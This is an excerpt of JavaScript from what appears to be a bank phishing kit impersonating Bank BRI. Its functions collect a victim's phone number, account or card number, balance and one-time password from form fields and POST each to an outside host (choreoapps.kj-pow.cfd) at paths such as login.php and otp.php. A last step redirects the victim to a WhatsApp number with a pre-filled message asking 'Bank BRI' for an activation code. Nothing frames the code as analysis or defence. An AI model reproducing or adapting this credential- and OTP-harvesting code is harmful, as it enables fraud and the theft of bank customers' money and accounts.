...
function sendNohp(){
  ...
  sessionStorage.setItem('tarif', tarif);
    ...
    var nohp = document.getElementById('nohp');    
      ...
      $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/38/no.php',
...
function sendDebit(){
   $('.load').fadeIn();
    ...
    var rek = document.getElementById('rek');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/38/login.php',
...
function sendSaldo(){
    ...
    var saldo = document.getElementById('saldo');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/38/saldo.php',
...
function sendOtp(){
    ...
    var nama1 = document.getElementById('nama1');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/38/otp.php',
...
function get(){
 ...
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://wa.me/62818834542?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
}     
